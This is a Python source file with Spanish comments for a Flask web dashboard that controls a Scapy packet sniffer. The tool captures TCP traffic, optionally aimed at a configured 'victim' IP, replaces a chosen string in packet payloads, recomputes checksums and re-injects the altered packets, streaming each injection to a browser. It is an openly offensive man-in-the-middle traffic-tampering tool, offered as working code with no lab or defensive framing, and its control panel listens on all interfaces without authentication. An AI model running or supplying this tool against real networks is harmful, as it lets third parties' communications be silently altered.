#!/usr/bin/env python3
import threading
import time
import json
import queue
import logging
from flask import Flask, render_template, jsonify, request, Response
from scapy.all import sniff, sendp, IP, TCP, Raw, get_if_list

app = Flask(__name__)

# Configurar logs para reducir verbosidad
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

# Cola de mensajería para Server-Sent Events
log_queue = queue.Queue(maxsize=100)

# Estado global
sniffer_thread = None
stop_sniffing = threading.Event()
stats = {
    "captured": 0,
    "injected": 0,
    "uptime": 0,
}
start_time = None

# Configuración activa
active_config = {
    "iface": "eth0",
    "victim": "",
    "filter": "tcp port 80",
    "target_str": "Hello",
    "replacement_str": "Hola"
}

def clean_old_logs():
    """Limpia la cola si se llena demasiado rápido para evitar fugas de memoria."""
    while log_queue.qsize() > 80:
        try:
            log_queue.get_nowait()
        except queue.Empty:
            break

def push_event(event_type, data):
    """Introduce un evento de actualización en la cola global."""
    clean_old_logs()
    try:
        log_queue.put_nowait({
            "type": event_type,
            "data": data,
            "stats": {
                **stats,
                "uptime": int(time.time() - start_time) if start_time else 0
            }
        })
    except queue.Full:
        pass

def process_packet(pkt):
    """Procesa e inyecta paquetes si coinciden con los criterios configurados."""
    if stop_sniffing.is_set():
        return

    # Incrementar capturas totales
    stats["captured"] += 1

    if pkt.haslayer(Raw) and pkt.haslayer(IP) and pkt.haslayer(TCP):
        victim_ip = active_config["victim"]
        if victim_ip:
            if pkt[IP].src != victim_ip and pkt[IP].dst != victim_ip:
                return

        payload = pkt[Raw].load
        try:
            payload_str = payload.decode('utf-8', errors='ignore')
        except Exception:
            payload_str = ""

        target = active_config["target_str"]
        replacement = active_config["replacement_str"]

        if target and target in payload_str:
            # Codificar términos a bytes
            target_bytes = target.encode('utf-8', errors='ignore')
            replacement_bytes = replacement.encode('utf-8', errors='ignore')

            new_payload = payload.replace(target_bytes, replacement_bytes)

            new_pkt = pkt.copy()
            new_pkt[Raw].load = new_payload

            # Forzar recalculo de checksums
            del new_pkt[IP].chksum
            del new_pkt[TCP].chksum

            # Inyectar paquete
            sendp(new_pkt, iface=pkt.sniffed_on, verbose=False)
            stats["injected"] += 1

            # Enviar actualización al frontend
            push_event("injection", {
                "src": pkt[IP].src,
                "dst": pkt[IP].dst,
                "sport": pkt[TCP].sport,
                "dport": pkt[TCP].dport,
                "original": payload_str[:300] + ("..." if len(payload_str) > 300 else ""),
                "modified": new_payload.decode('utf-8', errors='ignore')[:300] + ("..." if len(new_payload) > 300 else ""),
                "target": target,
                "replacement": replacement
            })

def sniff_worker():
    """Hilo de trabajo que ejecuta la captura de paquetes."""
    global start_time
    start_time = time.time()
    try:
        sniff(
            iface=active_config["iface"],
            filter=active_config["filter"],
            prn=process_packet,
            store=False,
            stop_filter=lambda p: stop_sniffing.is_set()
        )
    except Exception as e:
        push_event("error", {"message": str(e)})

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/interfaces', methods=['GET'])
def get_interfaces():
    try:
        interfaces = get_if_list()
        return jsonify({"status": "success", "interfaces": interfaces})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/status', methods=['GET'])
def get_status():
    is_active = sniffer_thread is not None and sniffer_thread.is_alive()
    uptime = int(time.time() - start_time) if (start_time and is_active) else 0
    return jsonify({
        "active": is_active,
        "config": active_config,
        "stats": {
            **stats,
            "uptime": uptime
        }
    })

@app.route('/api/start', methods=['POST'])
def start_sniffer():
    global sniffer_thread, start_time
    if sniffer_thread is not None and sniffer_thread.is_alive():
        return jsonify({"status": "error", "message": "El sniffer ya está en ejecución."}), 400

    data = request.json or {}
    active_config["iface"] = data.get("iface", "eth0")
    active_config["victim"] = data.get("victim", "").strip()
    active_config["filter"] = data.get("filter", "tcp port 80")
    active_config["target_str"] = data.get("target_str", "Hello")
    active_config["replacement_str"] = data.get("replacement_str", "Hola")

    # Resetear contadores
    stats["captured"] = 0
    stats["injected"] = 0
    start_time = time.time()

    stop_sniffing.clear()
    sniffer_thread = threading.Thread(target=sniff_worker, daemon=True)
    sniffer_thread.start()

    push_event("status_change", {"active": True, "message": "Sniffing iniciado correctamente."})
    return jsonify({"status": "success", "message": "Sniffing iniciado."})

@app.route('/api/stop', methods=['POST'])
def stop_sniffer():
    global sniffer_thread
    if sniffer_thread is None or not sniffer_thread.is_alive():
        return jsonify({"status": "error", "message": "El sniffer no está en ejecución."}), 400

    stop_sniffing.set()
    sniffer_thread.join(timeout=2.0)
    sniffer_thread = None

    push_event("status_change", {"active": False, "message": "Sniffing detenido."})
    return jsonify({"status": "success", "message": "Sniffing detenido."})

@app.route('/api/events')
def events():
    """Endpoint SSE para transmitir eventos en tiempo real al frontend."""
    def stream():
        # Enviar estado inicial
        initial_uptime = int(time.time() - start_time) if (start_time and sniffer_thread) else 0
        yield f"data: {json.dumps({'type': 'init', 'stats': {**stats, 'uptime': initial_uptime}})}\n\n"
        
        while True:
            try:
                # Esperar nueva actualización
                event = log_queue.get(timeout=1.0)
                yield f"data: {json.dumps(event)}\n\n"
            except queue.Empty:
                # Mantener conexión activa enviando latido/heartbeat de uptime
                if sniffer_thread and sniffer_thread.is_alive():
                    uptime = int(time.time() - start_time) if start_time else 0
                    yield f"data: {json.dumps({'type': 'tick', 'stats': {**stats, 'uptime': uptime}})}\n\n"
                else:
                    yield f"data: {json.dumps({'type': 'tick', 'stats': {**stats, 'uptime': 0}})}\n\n"
            except Exception:
                break
                
    return Response(stream(), mimetype='text/event-stream')

if __name__ == '__main__':
    # Ejecutar en el host local. Requiere sudo para interactuar con Scapy en interfaces de red locales.
    app.run(host='0.0.0.0', port=5000, debug=False)
